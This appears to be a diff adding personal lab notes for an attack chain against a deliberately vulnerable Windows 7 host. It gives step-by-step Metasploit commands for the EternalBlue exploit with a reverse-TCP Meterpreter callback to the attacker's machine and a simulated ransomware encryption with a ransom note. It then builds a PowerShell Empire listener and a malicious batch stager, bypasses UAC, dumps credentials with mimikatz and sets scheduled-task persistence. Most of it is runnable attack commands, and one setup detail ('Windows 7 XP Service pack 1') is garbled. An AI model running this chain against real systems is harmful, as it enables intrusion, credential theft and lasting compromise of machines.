@@ -1,0 +1,88 @@
+The setup (Kali, Windows 7 XP Service pack 1)
+1. Metasploit 
+-msfconsole
+-search eternalblue
+-use exploit/windows/smb/ms17_010_eternalblue
+-set RHOST (192.168.XXX.Windows7)
+-set LHOST (192.168.XXX.Kali)
+-set payloads windows/x64/meterpreter/reverse_tcp
+-exploit
+**Upgrading to meterpreter shell
+CTRL+Z to suspend regular shell
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+info (to list prerequisites)
+set LPORT 8080
+sessions -l to view active sessions
+set SESSION 5
+exploit
+set SESSIONS -i "X" x is the new meterpreter session you created in exploit
+meterpreter > upload malware.txt C:\\Users\\Desktop
+
+*************************************
+Prerequisites for Windows 7. 
+1.Monika FTP Utility 1.00 (Available for download on exploit db)
+-setup an account with user: root pass: 1234
+2.Xampp Control Panel v3.2.2
+3.Bitvise SSH Server 7.39 
+4.Create a vuln folder called "Secure" on the C: Drive.
+5.Add vuln files inside "Secure."
+
+****************************************************
+
+Encrypting a file on windows.
+-C:\Windows\system32>cd..
+-C:\Windows>cd..
+-C:\>cd secure
+-C:\Secure>cipher /e ** encrypts files. Folders can be decrypted by user
+-C:\Secure>echo TYPERANSOMHERE > "C:\Secure\YOURFILENAME.txt"
+-C:\Secure> cipher /d ** decrypts files.
+***************************************************
+SPARTA
+
+Using empire to generate a payload:
+Can use this guide to setup:
+https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali
+-linux-andor-debian-8-0/
+
+High level instructions:
+Create a basic empire payload, first make a listener on htpp, using usestager windows/launcher_bat, generate it and pass it over to the victim machine with meterpreter, then execute it with meterpreter.
+I will bypass UAC, then run mimikatz, then create persistence on the system. Using usemodule persistence/userland/schtasks, with an idle time of 1 minute set.
+In terminal:
+git clone https://github.com/EmpireProject/Empire.git
+cd Empire/setup
+./install.sh
+    When it gets to the password, just pound random keys, it generates the encryption.
+
+-cd ..
+
+-./empire
+Step 2 - Making Listener:
+(empire should now be open if it doesn't go to setup folder, and run reset.sh)
+-listeners
+-uselistener http
+("info" to show options)
+-set Host http://192.168.226.2:80
+-execute
+Step 3 - Make the payload
+-main
+-usestager windows/launcher_bat
+-set OutFile /tmp/malware.bat
+-set Listener http
+-execute
+Step 4 - Pass the file generated to the windows machine using meterpreter.
+Step 5 - Run it on the machine, either local or meterpreter.
+-execute -f C://Users//Desktop//malware.bat
+Step 6 - An agent should have spawned. 
+-agents
+-bypassuac http
+-interact <new agent process>
+-mimikatz
+Step 7 - setting up persistence 
+-usemodule persistence/userland/schtasks
+-set IdleTime 1
+-set Listener http
+-set TaskName <enter task name> 
+-execute
+Step 8
+
